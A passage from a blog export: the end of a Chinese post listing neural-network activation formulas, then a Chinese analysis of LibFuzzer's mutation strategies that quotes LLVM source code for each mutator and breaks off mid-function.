-250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></p>
<script type="math/tex; mode=display">f(x)=\frac{x}{1+|x|}</script><h1 id="relu"><a href="#relu" class="headerlink" title="relu"></a>relu</h1><p><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="10.753ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 4752.7 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mn" transform="translate(278, 0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(778, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mo" transform="translate(1222.7, 0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mtext" fill="red" stroke="red" transform="translate(2000.7, 0)"><path data-c="5C" d="M56 731Q56 740 62 745T75 750Q85 750 92 740Q96 733 270 255T444 -231Q444 -239 438 -244T424 -250Q414 -250 407 -240Q404 -236 230 242T56 731Z"></path><path data-c="69" d="M69 609Q69 637 87 653T131 669Q154 667 171 652T188 609Q188 579 171 564T129 549Q104 549 87 564T69 609ZM247 0Q232 3 143 3Q132 3 106 3T56 1L34 0H26V46H42Q70 46 91 49Q100 53 102 60T104 102V205V293Q104 345 102 359T88 378Q74 385 41 385H30V408Q30 431 32 431L42 432Q52 433 70 434T106 436Q123 437 142 438T171 441T182 442H185V62Q190 52 197 50T232 46H255V0H247Z" transform="translate(500, 0)"></path><path data-c="6E" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q450 438 463 329Q464 322 464 190V104Q464 66 466 59T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z" transform="translate(778, 0)"></path><path data-c="66" d="M273 0Q255 3 146 3Q43 3 34 0H26V46H42Q70 46 91 49Q99 52 103 60Q104 62 104 224V385H33V431H104V497L105 564L107 574Q126 639 171 668T266 704Q267 704 275 704T289 705Q330 702 351 679T372 627Q372 604 358 590T321 576T284 590T270 627Q270 647 288 667H284Q280 668 273 668Q245 668 223 647T189 592Q183 572 182 497V431H293V385H185V225Q185 63 186 61T189 57T194 54T199 51T206 49T213 48T222 47T231 47T241 46T251 46H282V0H273Z" transform="translate(1334, 0)"></path><path data-c="69" d="M69 609Q69 637 87 653T131 669Q154 667 171 652T188 609Q188 579 171 564T129 549Q104 549 87 564T69 609ZM247 0Q232 3 143 3Q132 3 106 3T56 1L34 0H26V46H42Q70 46 91 49Q100 53 102 60T104 102V205V293Q104 345 102 359T88 378Q74 385 41 385H30V408Q30 431 32 431L42 432Q52 433 70 434T106 436Q123 437 142 438T171 441T182 442H185V62Q190 52 197 50T232 46H255V0H247Z" transform="translate(1640, 0)"></path><path data-c="6E" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q450 438 463 329Q464 322 464 190V104Q464 66 466 59T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z" transform="translate(1918, 0)"></path></g><g data-mml-node="mo" transform="translate(4474.7, 0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g></g></g></svg></mjx-container></p>
<script type="math/tex; mode=display">f(x)=max(0,x)</script><h1 id="tanh"><a href="#tanh" class="headerlink" title="tanh"></a>tanh</h1><p><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="6.287ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2778.7 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mo" transform="translate(278, 0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(1056, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(1556, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(2000.7, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(2500.7, 0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g></g></g></svg></mjx-container></p>
<script type="math/tex; mode=display">tanhx=\frac{sinhx}{coshx}=\frac{e^x-e^{-x}}{e^x+e^{-x}}</script><h1 id="sigmoid"><a href="#sigmoid" class="headerlink" title="sigmoid"></a>sigmoid</h1><p><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="5.029ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2222.7 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389, 0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(889, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(1333.7, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(1833.7, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></p>
<script type="math/tex; mode=display">f(x)=\frac{1}{1+e^{-x}}</script><h1 id="hard-sigmoid"><a href="#hard-sigmoid" class="headerlink" title="hard_sigmoid"></a>hard_sigmoid</h1><p><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="4.526ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2000.7 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mn" transform="translate(278, 0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(778, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(1222.7, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(1722.7, 0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g></g></g></svg></mjx-container></p>
<script type="math/tex; mode=display">f(x)=\begin{cases}
0 & x < -2.5 \\
0.2x+0.5 & -2.5 \leq x \leq 2.5\\
1 & x > 2.5
\end{cases}</script><h1 id="linear"><a href="#linear" class="headerlink" title="linear"></a>linear</h1><p>Input tensor, unchanged.</p>
]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title>LibFuzzer中的变异策略分析</title>
    <url>/2019/12/11/libfuzzer%E4%B8%AD%E7%9A%84%E5%8F%98%E5%BC%82%E7%AD%96%E7%95%A5%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p><code>LibFuzzer</code>是一个模糊测试引擎，是<code>LLVM</code>项目的一部分，在当前<code>LLVM</code>中默认被支持。目前<code>llvm-project</code>提供较为方便的编译方法。</p>
<span id="more"></span>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><code>LibFuzzer</code>是<code>LLVM</code>项目中<code>compiler-rt</code>的一部分，在<a href="https://llvm.org/docs/LibFuzzer.html">这里</a>有其详细使用说明。其它使用说明包括Google的2篇文章<a href="https://github.com/google/fuzzing/blob/master/tutorial/libFuzzerTutorial.md">libFuzzerTutorial</a>和<a href="https://github.com/google/fuzzing/blob/master/docs/structure-aware-fuzzing.md">structure-aware-fuzzing</a>，中文翻译分别对应<a href="https://www.4hou.com/technology/16554.html">这里</a>和<a href="https://www.4hou.com/technology/16633.html">这里</a>。本文将分析<code>LibFuzzer</code>的变异策略，其关键代码位于<a href="https://github.com/llvm/llvm-project/blob/master/compiler-rt/lib/fuzzer/FuzzerMutate.cpp">这里</a>。</p>
<p>目前<code>LibFuzzer</code>位于<code>LLVM</code>项目中，因此其编译方法只需在创建<code>Makefile</code>的过程中指定<code>compiler-rt</code>即可：<code>cmake -G &quot;Unix Makefiles&quot; -DLLVM_ENABLE_PROJECTS=&quot;clang;clang-tools-extra;compiler-rt&quot;</code>。</p>
<p>在代码开始处可以看到<code>Dispatcher</code>中其用到的所有变异策略，共有15种，下面依次进行分析。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">MutationDispatcher::MutationDispatcher(Random &amp;Rand,</span><br><span class="line">                                       <span class="keyword">const</span> FuzzingOptions &amp;Options)</span><br><span class="line">    : Rand(Rand), Options(Options) &#123;</span><br><span class="line">  DefaultMutators.insert(</span><br><span class="line">      DefaultMutators.begin(),</span><br><span class="line">      &#123;</span><br><span class="line">          &#123;&amp;MutationDispatcher::Mutate_EraseBytes, <span class="string">&quot;EraseBytes&quot;</span>&#125;,</span><br><span class="line">          &#123;&amp;MutationDispatcher::Mutate_InsertByte, <span class="string">&quot;InsertByte&quot;</span>&#125;,</span><br><span class="line">          &#123;&amp;MutationDispatcher::Mutate_InsertRepeatedBytes,</span><br><span class="line">           <span class="string">&quot;InsertRepeatedBytes&quot;</span>&#125;,</span><br><span class="line">          &#123;&amp;MutationDispatcher::Mutate_ChangeByte, <span class="string">&quot;ChangeByte&quot;</span>&#125;,</span><br><span class="line">          &#123;&amp;MutationDispatcher::Mutate_ChangeBit, <span class="string">&quot;ChangeBit&quot;</span>&#125;,</span><br><span class="line">          &#123;&amp;MutationDispatcher::Mutate_ShuffleBytes, <span class="string">&quot;ShuffleBytes&quot;</span>&#125;,</span><br><span class="line">          &#123;&amp;MutationDispatcher::Mutate_ChangeASCIIInteger, <span class="string">&quot;ChangeASCIIInt&quot;</span>&#125;,</span><br><span class="line">          &#123;&amp;MutationDispatcher::Mutate_ChangeBinaryInteger, <span class="string">&quot;ChangeBinInt&quot;</span>&#125;,</span><br><span class="line">          &#123;&amp;MutationDispatcher::Mutate_CopyPart, <span class="string">&quot;CopyPart&quot;</span>&#125;,</span><br><span class="line">          &#123;&amp;MutationDispatcher::Mutate_CrossOver, <span class="string">&quot;CrossOver&quot;</span>&#125;,</span><br><span class="line">          &#123;&amp;MutationDispatcher::Mutate_AddWordFromManualDictionary,</span><br><span class="line">           <span class="string">&quot;ManualDict&quot;</span>&#125;,</span><br><span class="line">          &#123;&amp;MutationDispatcher::Mutate_AddWordFromPersistentAutoDictionary,</span><br><span class="line">           <span class="string">&quot;PersAutoDict&quot;</span>&#125;,</span><br><span class="line">      &#125;);</span><br><span class="line">  <span class="keyword">if</span>(Options.UseCmp)</span><br><span class="line">    DefaultMutators.push_back(</span><br><span class="line">        &#123;&amp;MutationDispatcher::Mutate_AddWordFromTORC, <span class="string">&quot;CMP&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (EF-&gt;LLVMFuzzerCustomMutator)</span><br><span class="line">    Mutators.push_back(&#123;&amp;MutationDispatcher::Mutate_Custom, <span class="string">&quot;Custom&quot;</span>&#125;);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    Mutators = DefaultMutators;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (EF-&gt;LLVMFuzzerCustomCrossOver)</span><br><span class="line">    Mutators.push_back(</span><br><span class="line">        &#123;&amp;MutationDispatcher::Mutate_CustomCrossOver, <span class="string">&quot;CustomCrossOver&quot;</span>&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="EraseBytes"><a href="#EraseBytes" class="headerlink" title="EraseBytes"></a>EraseBytes</h2><p>随机删除<code>Data</code>中的<code>N</code>个数据。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">MutationDispatcher::Mutate_EraseBytes</span><span class="params">(<span class="keyword">uint8_t</span> *Data, <span class="keyword">size_t</span> Size,</span></span></span><br><span class="line"><span class="function"><span class="params">                                             <span class="keyword">size_t</span> MaxSize)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (Size &lt;= <span class="number">1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">size_t</span> N = Rand(Size / <span class="number">2</span>) + <span class="number">1</span>;</span><br><span class="line">  assert(N &lt; Size);</span><br><span class="line">  <span class="keyword">size_t</span> Idx = Rand(Size - N + <span class="number">1</span>);</span><br><span class="line">  <span class="comment">// Erase Data[Idx:Idx+N].</span></span><br><span class="line">  memmove(Data + Idx, Data + Idx + N, Size - Idx - N);</span><br><span class="line">  <span class="comment">// Printf(&quot;Erase: %zd %zd =&gt; %zd; Idx %zd\n&quot;, N, Size, Size - N, Idx);</span></span><br><span class="line">  <span class="keyword">return</span> Size - N;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="InsertByte"><a href="#InsertByte" class="headerlink" title="InsertByte"></a>InsertByte</h2><p>在<code>Data</code>的一个随机位置插入一个随机字符。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">MutationDispatcher::Mutate_InsertByte</span><span class="params">(<span class="keyword">uint8_t</span> *Data, <span class="keyword">size_t</span> Size,</span></span></span><br><span class="line"><span class="function"><span class="params">                                             <span class="keyword">size_t</span> MaxSize)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (Size &gt;= MaxSize) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">size_t</span> Idx = Rand(Size + <span class="number">1</span>);</span><br><span class="line">  <span class="comment">// Insert new value at Data[Idx].</span></span><br><span class="line">  memmove(Data + Idx + <span class="number">1</span>, Data + Idx, Size - Idx);</span><br><span class="line">  Data[Idx] = RandCh(Rand);</span><br><span class="line">  <span class="keyword">return</span> Size + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="InsertRepeatedBytes"><a href="#InsertRepeatedBytes" class="headerlink" title="InsertRepeatedBytes"></a>InsertRepeatedBytes</h2><p>在<code>Data</code>中的一个随机位置处连续插入<code>N</code>（至少<code>3</code>个）个相同的随机字符。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">MutationDispatcher::Mutate_InsertRepeatedBytes</span><span class="params">(<span class="keyword">uint8_t</span> *Data,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                      <span class="keyword">size_t</span> Size,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                      <span class="keyword">size_t</span> MaxSize)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">size_t</span> kMinBytesToInsert = <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> (Size + kMinBytesToInsert &gt;= MaxSize) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">size_t</span> MaxBytesToInsert = <span class="built_in">std</span>::min(MaxSize - Size, (<span class="keyword">size_t</span>)<span class="number">128</span>);</span><br><span class="line">  <span class="keyword">size_t</span> N = Rand(MaxBytesToInsert - kMinBytesToInsert + <span class="number">1</span>) + kMinBytesToInsert;</span><br><span class="line">  assert(Size + N &lt;= MaxSize &amp;&amp; N);</span><br><span class="line">  <span class="keyword">size_t</span> Idx = Rand(Size + <span class="number">1</span>);</span><br><span class="line">  <span class="comment">// Insert new values at Data[Idx].</span></span><br><span class="line">  memmove(Data + Idx + N, Data + Idx, Size - Idx);</span><br><span class="line">  <span class="comment">// Give preference to 0x00 and 0xff.</span></span><br><span class="line">  <span class="keyword">uint8_t</span> Byte = Rand.RandBool() ? Rand(<span class="number">256</span>) : (Rand.RandBool() ? <span class="number">0</span> : <span class="number">255</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">    Data[Idx + i] = Byte;</span><br><span class="line">  <span class="keyword">return</span> Size + N;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="ChangeByte"><a href="#ChangeByte" class="headerlink" title="ChangeByte"></a>ChangeByte</h2><p>将<code>Data</code>中一个随机位置处的内容修改为一个随机字符。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">MutationDispatcher::Mutate_ChangeByte</span><span class="params">(<span class="keyword">uint8_t</span> *Data, <span class="keyword">size_t</span> Size,</span></span></span><br><span class="line"><span class="function"><span class="params">                                             <span class="keyword">size_t</span> MaxSize)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (Size &gt; MaxSize) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">size_t</span> Idx = Rand(Size);</span><br><span class="line">  Data[Idx] = RandCh(Rand);</span><br><span class="line">  <span class="keyword">return</span> Size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="ChangeBit"><a href="#ChangeBit" class="headerlink" title="ChangeBit"></a>ChangeBit</h2><p>反转<code>Data</code>中一个随机位置处的数据的随机一位。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">MutationDispatcher::Mutate_ChangeBit</span><span class="params">(<span class="keyword">uint8_t</span> *Data, <span class="keyword">size_t</span> Size,</span></span></span><br><span class="line"><span class="function"><span class="params">                                            <span class="keyword">size_t</span> MaxSize)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (Size &gt; MaxSize) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">size_t</span> Idx = Rand(Size);</span><br><span class="line">  Data[Idx] ^= <span class="number">1</span> &lt;&lt; Rand(<span class="number">8</span>);</span><br><span class="line">  <span class="keyword">return</span> Size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="ShuffleBytes"><a href="#ShuffleBytes" class="headerlink" title="ShuffleBytes"></a>ShuffleBytes</h2><p>打乱<code>Data</code>中随机位置起<code>[1,8]</code>个随机数据的顺序，由<code>std::shuffle</code>实现。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">MutationDispatcher::Mutate_ShuffleBytes</span><span class="params">(<span class="keyword">uint8_t</span> *Data, <span class="keyword">size_t</span> Size,</span></span></span><br><span class="line"><span class="function"><span class="params">                                               <span class="keyword">size_t</span> MaxSize)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (Size &gt; MaxSize || Size == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">size_t</span> ShuffleAmount =</span><br><span class="line">      Rand(<span class="built_in">std</span>::min(Size, (<span class="keyword">size_t</span>)<span class="number">8</span>)) + <span class="number">1</span>; <span class="comment">// [1,8] and &lt;= Size.</span></span><br><span class="line">  <span class="keyword">size_t</span> ShuffleStart = Rand(Size - ShuffleAmount);</span><br><span class="line">  assert(ShuffleStart + ShuffleAmount &lt;= Size);</span><br><span class="line">  <span class="built_in">std</span>::shuffle(Data + ShuffleStart, Data + ShuffleStart + ShuffleAmount, Rand);</span><br><span class="line">  <span class="keyword">return</span> Size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="ChangeASCIIInt"><a href="#ChangeASCIIInt" class="headerlink" title="ChangeASCIIInt"></a>ChangeASCIIInt</h2><p>在<code>Data</code>中寻找一段连续数字数据<code>[B,E)</code>，然后手动计算其数值并随机做一次计算（自增1，自减1，除以2，乘2，取小于其平方的随机数），并将新数值手动解析为字符串放入<code>[B,E)</code>中，不足补<code>0</code>，超出截断。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">MutationDispatcher::Mutate_ChangeASCIIInteger</span><span class="params">(<span class="keyword">uint8_t</span> *Data, <span class="keyword">size_t</span> Size,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                     <span class="keyword">size_t</span> MaxSize)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (Size &gt; MaxSize) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">size_t</span> B = Rand(Size);</span><br><span class="line">  <span class="keyword">while</span> (B &lt; Size &amp;&amp; !<span class="built_in">isdigit</span>(Data[B])) B++;</span><br><span class="line">  <span class="keyword">if</span> (B == Size) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">size_t</span> E = B;</span><br><span class="line">  <span class="keyword">while</span> (E &lt; Size &amp;&amp; <span class="built_in">isdigit</span>(Data[E])) E++;</span><br><span class="line">  assert(B &lt; E);</span><br><span class="line">  <span class="comment">// now we have digits in [B, E).</span></span><br><span class="line">  <span class="comment">// strtol and friends don&#x27;t accept non-zero-teminated data, parse it manually.</span></span><br><span class="line">  <span class="keyword">uint64_t</span> Val = Data[B] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">size_t</span> i = B + <span class="number">1</span>; i &lt; E; i++)</span><br><span class="line">    Val = Val * <span class="number">10</span> + Data[i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Mutate the integer value.</span></span><br><span class="line">  <span class="keyword">switch</span>(Rand(<span class="number">5</span>)) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>: Val++; <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>: Val--; <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>: Val /= <span class="number">2</span>; <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>: Val *= <span class="number">2</span>; <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>: Val = Rand(Val * Val); <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>: assert(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Just replace the bytes with the new ones, don&#x27;t bother moving bytes.</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">size_t</span> i = B; i &lt; E; i++) &#123;</span><br><span class="line">    <span class="keyword">size_t</span> Idx = E + B - i - <span class="number">1</span>;</span><br><span class="line">    assert(Idx &gt;= B &amp;&amp; Idx &lt; E);</span><br><span class="line">    Data[Idx] = (Val % <span class="number">10</span>) + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">    Val /= <span class="number">10</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> Size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="ChangeBinInt"><a href="#ChangeBinInt" class="headerlink" title="ChangeBinInt"></a>ChangeBinInt</h2><p>选<code>Data</code>中随机位置处的随机长度（8、4、2、1字节之一）数据，将<code>Size</code>（随机数据位于<code>Data</code>前<code>64</code>个位置中）或其自身的值随机变换后替换该处数据。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">MutationDispatcher::Mutate_ChangeBinaryInteger</span><span class="params">(<span class="keyword">uint8_t</span> *Data,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                      <span class="keyword">size_t</span> Size,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                      <span class="keyword">size_t</span> MaxSize)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (Size &gt; MaxSize) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">switch</span> (Rand(<span class="number">4</span>)) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>: <span class="keyword">return</span> ChangeBinaryInteger&lt;<span class="keyword">uint64_t</span>&gt;(Data, Size, Rand);</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>: <span class="keyword">return</span> ChangeBinaryInteger&lt;<span class="keyword">uint32_t</span>&gt;(Data, Size, Rand);</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>: <span class="keyword">return</span> 